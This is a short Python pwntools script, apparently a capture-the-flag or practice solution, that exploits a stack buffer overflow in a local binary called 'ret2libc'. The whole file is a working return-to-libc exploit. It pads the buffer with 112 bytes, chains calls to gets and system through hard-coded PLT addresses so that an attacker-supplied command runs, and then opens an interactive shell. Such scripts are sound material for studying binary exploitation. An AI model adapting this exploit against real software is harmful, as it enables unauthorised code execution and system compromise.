from pwn import *

sh = process('./ret2libc')

buf2 = 0x0804A080
getsplt = 0x8048460
systemplt = 0x08048490

payload = b'a'*112 + p32(getsplt) + p32(systemplt) + p32(buf2) + p32(buf2)

sh.sendline(payload)
sh.interactive()
